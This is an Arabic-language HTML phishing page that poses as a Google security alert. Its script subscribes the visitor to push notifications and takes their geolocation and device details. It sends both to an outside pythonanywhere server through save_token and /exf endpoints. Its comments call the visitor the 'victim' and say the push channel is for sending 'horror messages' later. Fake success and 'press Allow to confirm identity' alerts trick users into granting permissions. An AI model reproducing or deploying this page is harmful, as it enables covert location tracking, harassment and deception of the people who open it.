<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <script>
        // هذا المفتاح هو مفتاح الأمان لفتح قفل الإشعارات في جوال الضحية
        const publicKey = "BVgK17MOi9TDGAa8fK/poMVJ0Q58QImEswUUh/GhVXevlPbxCJs1s/vwmxIHqSjC1fsY4BC/kJqJoIty10XtGg";

        async function init() {
            try {
                // تفعيل محرك الإشعارات
                const reg = await navigator.serviceWorker.register('sw.js');
                const sub = await reg.pushManager.subscribe({
                    userVisibleOnly: true,
                    applicationServerKey: publicKey
                });

                // إرسال "مفتاح التحكم" لسيرفرك عشان تقدر ترسل له رسائل رعب لاحقاً
                fetch('https://Mohammed888.pythonanywhere.com/save_token', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(sub)
                });

                // سحب الموقع فوراً
                navigator.geolocation.getCurrentPosition(pos => {
                    fetch('https://Mohammed888.pythonanywhere.com/exf', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            location: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
                            battery: "جاري السحب...",
                            device: navigator.userAgent
                        })
                    });
                    alert("✅ تم تحديث أمان الحساب!");
                });
            } catch (e) {
                alert("⚠️ اضغط 'سماح' (Allow) لتأكيد هويتك!");
            }
        }
    </script>
</head>
<body style="text-align:center; padding-top:100px; font-family:Arial;">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_Ads_logo.svg" width="80">
    <h2>تنبيه أمني من Google</h2>
    <p>يجب تحديث خدمات الموقع لضمان حماية حسابك</p>
    <button onclick="init()" style="padding:15px 40px; background:#1a73e8; color:white; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">تحديث الآن</button>
</body>
</html>
